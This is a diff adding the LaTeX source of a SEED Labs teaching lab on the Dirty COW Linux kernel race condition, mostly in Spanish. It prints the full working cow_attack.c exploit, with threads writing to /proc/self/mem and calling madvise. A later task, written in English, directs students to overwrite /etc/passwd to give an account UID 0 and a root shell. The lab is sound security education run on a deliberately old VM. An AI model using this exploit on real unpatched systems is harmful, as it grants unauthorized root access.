@@ -1,0 +1,280 @@
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  Copyright by Wenliang Du.                                       %%
+%%  This work is licensed under the Creative Commons                %%
+%%  Attribution-NonCommercial-ShareAlike 4.0 International License. %%
+%%  To view a copy of this license, visit                           %%
+%%  http://creativecommons.org/licenses/by-nc-sa/4.0/.              %%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\newcommand{\commonfolder}{../../common-files}
+
+\input{\commonfolder/header}
+\input{\commonfolder/copyright}
+
+
+\newcommand{\cowFigs}{./Figs}
+
+\lhead{\bfseries SEED Labs -- Laboratorio de Dirty COW }
+
+
+\begin{document}
+
+\begin{center}
+{\LARGE Laboratorio de Dirty COW }
+\end{center}
+
+\seedlabcopyright{2017}
+
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Descripción General}
+
+Dirty COW es un caso interesante de una vulnerabilidad de race condition. Existe en el kernel de \linux desde Septiembre del 2007, fue descubierta y explotada en Octubre de 2016. 
+Esta vulnerabilidad afecta a todos los sistemas operativos \linux-based incluyendo Android y su impacto en bastante grave: los atacantes pueden obtener privilegios de root explotando esta condición. Esta vulnerbilidad reside en el código dentro del kernel de \linux en el mecanismo de copy-on-write (COW). Explotando esta vulnerabilidad los atacantes pueden modificar cualquier archivo protegido incluso archivos que son de sólo lectura.
+
+El objetivo de este laboratorioo es que los estudiantes ganen experiencia en el ataque de la vulnerabilidad Dirty COW como así puedan entender la vulnerabilidad y su forma de explotarla. En estte laboratorio loos estudiantes explotarán esta condición de carrera y podrán obtener privilegios de root.
+ 
+
+\paragraph{Lecturas y Videos.}
+Para una cobertura más detallada en el ataque de Dirty COW puede consultar
+
+\begin{itemize}
+\item Capítulo 8 del libro de SEED, \seedbook
+\item Sección 7 del curso de SEED en Udemy, \seedcsvideo
+\end{itemize}
+
+
+\paragraph{Entorno de Laboratorio.}  Este laboratorio ha sido probado en nuestra Máquina Virtual Ubuntu 12.04 que puede ser descargada del sitio oficial de SEED.
+Si ud. está usando SEEDUbuntu 16.04 VM, este ataque no funcionará, debido a que está vulnerabilidad ha sido corregida en el kernel que corre esta VM. Puede descargar nuestra Máquina Virtual SEEDUbuntu12.04 del sitio web de SEED o si posee una cuenta EC2 en Amazon puede hacerlo desde ``Community AMIs''. El nombre de esta máquina virtual es \texttt{SEEDUbuntu12.04-Generic}. Cabe aclarar que Amazon clasifica a esta Máquina Virtual como de 64-bits esto no es correcto. La Máquina Virtual es de 32-bits. Sin embargo esta información errónea no causa ningún tipo de problemas.
+
+
+
+% *******************************************
+\section{Tarea 1: Modificar un archivo de prueba de sólo lectura}
+
+El objetivo de esta tarea es escribir en un archivo de sólo lectura usando la vulnerabilidad de Dirty COW.
+
+\subsection{Crear un archivo de prueba}
+
+Primero necesitamos seleccionar el archivo objetivo. Aunque este archivo puede ser cualquiera que sea de sólo lectura y que pertenezca al sistema, usaremos un archivo de prueba, y de esta forma evitaremos corromper un archivo de importancia en caso que algo salga mal. Por favor cree un archivo con el nombre  \texttt{zzz} en el directorio de root, cambie los permisos del archivo a sóloolecttura para los usuarios no privilegiados y inserte algún contenido dentro del mismo, puede usar  \texttt{gedit} para editar el archivo.
+ 
+
+\begin{lstlisting}
+$ sudo touch /zzz
+$ sudo chmod 644 /zzz
+$ sudo gedit /zzz
+$ cat /zzz
+111111222222333333
+$ ls -l /zzz
+-rw-r--r-- 1 root root 19 Oct 18 22:03 /zzz
+$ echo 99999 > /zzz
+bash: /zzz: (*@\texttt{Permission denied}@*)
+\end{lstlisting}
+ 
+Dado el experimento anterior. Podemos observar que si tratamos de escribir en este archivo como un usuario no privilegiado, no podremos, esto se debe a que el archivo es de sólo lectura para usuarios normales. Sin embargo, usando la vulnerabilidad Dirty COW, podemos encontrar la forma de escribir en este archivo aunque sea de sólo lectura para nosotros. Nuestro objetivo será reemplazar el patrón  \texttt{"222222"} con \texttt{"******"}. 
+
+
+\subsection{Configurando el Thread de Mapeo en Memoria}
+
+Puede descargar el programa \texttt{cow\_attack.c} del sitio web del laboratorio. Este programa utiliza tres threads: el thread principal, el thread de escritura y el thread madvise.
+El thread principal mapea el archivo \texttt{/zzz} en memoria, encuenttra donde se ubica el patrón \texttt{"222222"} y crea dos threads para explotar la vulnerabilidad Dirty COW en el kernel del sistema operativo.
+
+
+\begin{lstlisting}[caption={The main thread},
+                   label=cow:code:cow_attack:main]
+/* cow_attack.c  (the main thread) */
+
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <pthread.h>
+#include <sys/stat.h>
+#include <string.h>
+
+void *map;
+
+int main(int argc, char *argv[])
+{
+  pthread_t pth1,pth2;
+  struct stat st;
+  int file_size;
+
+  // Open the target file in the read-only mode.
+  int f=open("/zzz", O_RDONLY);
+
+  // Map the file to COW memory using MAP_PRIVATE.
+  fstat(f, &st);
+  file_size = st.st_size;
+  map=mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);
+
+  // Find the position of the target area
+  char *position = strstr(map, "222222");                         (*@\ding{192}@*)
+
+  // We have to do the attack using two threads.
+  pthread_create(&pth1, NULL, madviseThread, (void  *)file_size); (*@\ding{193}@*)
+  pthread_create(&pth2, NULL, writeThread, position);             (*@\ding{194}@*)
+
+  // Wait for the threads to finish.
+  pthread_join(pth1, NULL);
+  pthread_join(pth2, NULL);
+  return 0;
+}
+
+\end{lstlisting}
+
+En el código anterior, necesitamos encontrar donde se ubica el patróon \texttt{"222222"}, esto lo hacemos uando una función de cadena llamada \texttt{strstr()} que nos devuelve la locación en memoria donde está el patrón \texttt{"222222"} (Línea \ding{192}). Luego se disparan dos thrads: el \texttt{madviseThread} (Línea \ding{193}) y el 
+\texttt{writeThread} (Línea \ding{194}).
+
+
+
+% -------------------------------------------
+% SUBSECTION
+% -------------------------------------------
+\subsection{Configurando el thread \texttt{write}}
+
+El trabajo del thread \texttt{write} is reemplazar en memoria la cadena \texttt{"222222"} con \texttt{"******"}. Debido a que la memoria mapeada es de tipo COW, este thread solamente podrá modificar el contenido en una copia de la memoria mapeada que no causará ningún cambio en el archivo \texttt{/zzz}.
+
+\begin{lstlisting}[caption={The \texttt{write} thread},
+                   label=cow:code:cow_attack:write]
+/* cow_attack.c (the write thread) */
+
+void *writeThread(void *arg)
+{
+  char *content= "******";
+  off_t offset = (off_t) arg;
+
+  int f=open("/proc/self/mem", O_RDWR);
+  while(1) {
+    // Move the file pointer to the corresponding position.
+    lseek(f, offset, SEEK_SET);
+    // Write to the memory.
+    write(f, content, strlen(content));
+  }
+}
+\end{lstlisting}
+
+
+\subsection{El Thread \texttt{madvise}}
+
+El thread \texttt{madvise} hace sólo una cosa: descarta la copia privada de la memooria mapeada para que la tabla de páginas apunte nuevamente a la memoria mapeada originalmente.
+
+
+\begin{lstlisting}[caption={The \texttt{madvise} thread},
+                   label=cow:code:cow_attack:madvise]
+/* cow_attack.c (the madvise thread) */
+
+void *madviseThread(void *arg)
+{
+  int file_size = (int) arg;
+  while(1){
+      madvise(map, file_size, MADV_DONTNEED);
+  }
+}
+\end{lstlisting}
+
+
+\subsection{Lanzar el Ataque}
+
+Si las llamadas al sistema \texttt{write()} y  \texttt{madvise()}  son invocadas alternadas, es decir, una es invocada una vez que la otra termina, la operación\texttt{write} siempre se hará sobre la copia privada de memoria y nunca se modificará nuestro archivo original. Para que nuestro ataque sea exitoso, es invocar a  la llamada al sistema \texttt{madvise()} mientras que \texttt{write()} está en ejecución. No siempre será posible esto, por lo que debemos de tratar el ataque varias veces. Siempre y cuando nuestra probabilidad no sea muy baja, tenemos una chance de explotar la vulnerabilidad. Es por eso que en los threads ejecutamos las llamadas al sistemas en un loop infinito.
+Compile \texttt{cow\_attack.c} y corralo durante unos segundos. Si su ataque es exitoso, debería de ver las modificaciones en el archivo \texttt{/zzz}.
+Escriba sus resultados en el informe del laboratorioo y explique como logró hacerlo.
+
+
+\begin{lstlisting}
+$ gcc cow_attack.c -lpthread
+$ a.out
+  ... press Ctrl-C after a few seconds ...
+\end{lstlisting}
+
+
+
+\section{Tarea 2: Modificar el archivo de password para obtener privilegios de root} 
+
+Now, let's launch the attack on a real system file, so we can gain the root privilege.
+We choose the \texttt{/etc/passwd} file as our target file. This file
+is world-readable, but non-root users cannot modify it. The file contains
+the user account information, one record for each user.  Assume that our user name is
+\texttt{seed} . The following lines show the records for root and \texttt{seed}:
+
+\begin{lstlisting}
+root:x:0:0:root:/root:/bin/bash
+seed:x:1000:1000:Seed,123,,:/home/seed:/bin/bash
+\end{lstlisting}
+
+Each of the above record contains seven colon-separated fields. Our interest is on the third
+field, which specifies the user ID~(UID) value assigned to a user. UID is the primary
+basis for access control in \linux, so this value is critical to security.
+The root user's UID field contains a special value 0; that is what makes it the superuser,
+not its name. Any user with UID \texttt{0} is treated by the system as root,
+regardless of what user name he or she has.
+The \texttt{seed} user's ID is only \texttt{1000}, so
+it does not have the root privilege. However, if we can change the value to
+\texttt{0}, we can turn it
+into root. We will exploit the Dirty COW vulnerability to achieve this goal.
+
+In our experiment, we will not use the \texttt{seed} account, because this account is used
+for most of the experiments in this book; if we forget to change the UID back after the
+experiment, other experiments will be affected.  Instead, we create a new account called
+\texttt{charlie}, and we will turn this normal user into root using
+the Dirty COW attack.
+Adding a new account can be achieved using the \texttt{adduser} command.
+After the account is created, a new
+record will be added to \texttt{/etc/passwd}.  See
+the following:
+
+\begin{lstlisting}
+$ sudo adduser charlie
+  ...
+$ cat /etc/passwd | grep charlie
+charlie:x:1001:1001:,,,:/home/charlie:/bin/bash
+\end{lstlisting}
+
+We suggest that you save a copy of the \texttt{/etc/passwd} file, just in case you 
+make a mistake and corrupt this file. An alternative is to take a snapshot of your VM before
+working on this lab, so you can always roll back if the VM got corrupted. 
+
+
+
+\paragraph{Tarea:} You need to modify the \texttt{charlie}'s entry in
+\texttt{/etc/passwd}, so the third field is changed from \texttt{1001} to 
+\texttt{0000}, essentially turning \texttt{charlie} into a root account. 
+The file is not writable to \texttt{charlie}, but we can use 
+the Dirty COW attack to write to this file. You can  
+modify the \texttt{cow\_attack.c} program from Task 1 to achieve 
+this goal. 
+
+After your attack is successful, if you switch user to \texttt{charlie}, you should be able to see the 
+\texttt{\#} sign at the shell prompt, which is an indicator of the root shell. If you 
+run the \texttt{id} command, you should be able to see that you have gained the root privilege. 
+
+\begin{lstlisting}
+seed@ubuntu$ su charlie
+Passwd: 
+root@ubuntu# id
+(*@\textbf{uid=0(root)}@*) gid=1001(charlie) groups=0(root),1001(charlie)
+\end{lstlisting}
+ 
+
+
+% *******************************************
+% SECTION
+% ******************************************* 
+\section{Informe del Laboratorio}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\input{\commonfolder/submission}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+% *******************************************
+% SECTION
+% *******************************************
+\section*{Agradecimientos}
+
+\input{\commonfolder/acknowledgments}
+
+
+
+\end{document}
